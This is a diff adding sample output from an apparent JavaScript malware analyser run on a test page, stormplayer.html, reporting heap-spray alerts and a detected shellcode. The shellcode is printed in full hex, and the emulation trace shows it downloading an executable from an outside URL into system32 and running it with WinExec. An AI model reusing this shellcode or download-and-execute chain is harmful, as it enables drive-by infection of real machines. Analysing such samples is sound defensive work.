@@ -1,0 +1,29 @@
+PYTHONPATH='lib/python:' python main.py http://172.31.25.227/honeyjs/stormplayer.html
+
+DEBUG: Alerts:
+====================================
+|--------AID:1----------
+|ATYPE:ALERT_SHELLCODE
+|MESSAGE:Shellcode Detected!
+|MISC:{}
+|SHELLCODE:
+90909090e9ef0000005a64a1300000008b400c8b701cad8b40088bd88b733c8b741e7803f38b7e2003fb8b4e1433ed5657518b3f03fb8bf26a0e59f3a67408595f83c70445e2e9595f5e8bcd8b462403c3d1e103c133c9668b088b461c03c3c1e10203c18b0003c38bfa8bf783c60e8bd06a0459e86a00000083c60d5256ff57fc5a8bd86a0159e85700000083c6135646803e8075fa8036805e83ec408bdcc703636d64204343434366c7032f634343c60320436a2053ff57ecc704035c612e65c74403047865000033c05050535650ff57fc8bdc6a0053ff57f0685124400058ffd033c0ac85c075f951525653ffd25a59abe2ee33c0c3e80cffffff47657450726f63416464726573730047657453797374656d4469726563746f7279410057696e457865630045786974546872656164004c6f61644c696272617279410075726c6d6f6e0055524c446f776e6c6f6164546f46696c654100687474703a2f2f772e71716e6574636e2e636e2f64322e6578650080
+|Now run it:
+PROFILE:
+[{'rettype': 'FARPROC WINAPI', 'retval': 2088849130, 'name': 'GetProcAddress', 'arguments': [('HMODULE', 'hModule', None), ('LPCSTR', 'lpProcName', ('', '', 'GetSystemDirectoryA'))]}, {'rettype': 'FARPROC WINAPI', 'retval': 2089161581, 'name': 'GetProcAddress', 'arguments': [('HMODULE', 'hModule', None), ('LPCSTR', 'lpProcName', ('', '', 'WinExec'))]}, {'rettype': 'FARPROC WINAPI', 'retval': 2088812632, 'name': 'GetProcAddress', 'arguments': [('HMODULE', 'hModule', None), ('LPCSTR', 'lpProcName', ('', '', 'ExitThread'))]}, {'rettype': 'FARPROC WINAPI', 'retval': 2088770935, 'name': 'GetProcAddress', 'arguments': [('HMODULE', 'hModule', None), ('LPCSTR', 'lpProcName', ('', '', 'LoadLibraryA'))]}, {'rettype': 'HMODULE', 'retval': 2113011712, 'name': 'LoadLibraryA', 'arguments': [('LPCTSTR', 'lpFileName', ('', '', 'urlmon'))]}, {'rettype': 'FARPROC WINAPI', 'retval': 2113384635, 'name': 'GetProcAddress', 'arguments': [('HMODULE', 'hModule', None), ('LPCSTR', 'lpProcName', ('', '', 'URLDownloadToFileA'))]}, {'rettype': 'UINT', 'retval': 19, 'name': 'GetSystemDirectory', 'arguments': [('LPTSTR', 'lpBuffer', ('', '', 'c:\\WINDOWS\\system32')), ('UINT', 'uSize', 32)]}, {'rettype': 'HRESULT', 'retval': 0, 'name': 'URLDownloadToFile', 'arguments': [('LPUNKNOWN', 'pCaller', None), ('LPCTSTR', 'szURL', ('', '', 'http://w.qqnetcn.cn/d2.exe')), ('LPCTSTR', 'szFileName', ('', '', 'c:\\WINDOWS\\system32\\a.exe')), ('DWORD', 'dwReserved', 0), ('LPBINDSTATUSCALLBACK', 'lpfnCB', 0)]}, {'rettype': 'UINT WINAPI', 'retval': 32, 'name': 'WinExec', 'arguments': [('LPCSTR', 'lpCmdLine', ('', '', 'cmd /c c:\\WINDOWS\\system32\\a.exe')), ('UINT', 'uCmdShow', 0)]}]
+====================================
+|--------AID:2----------
+|ATYPE:ALERT_HEAPSPRAY
+|MESSAGE:Heapspray Detected!
+|HIT:3
+|LENGTH:523874
+|ENTROPY:0.0
+|MISC:{'sledge_char': '\x90', 'sec_char_cnt': 0, 'sledge_cnt': 523874, 'sec_char': '\x00'}
+====================================
+|--------AID:3----------
+|ATYPE:ALERT_HEAPSPRAY
+|MESSAGE:Heapspray Detected!
+|HIT:300
+|LENGTH:524248
+|ENTROPY:0.0128013506253
+|MISC:{'sledge_char': '\x90', 'sec_char_cnt': 25, 'sledge_cnt': 523878, 'sec_char': '\x00'}
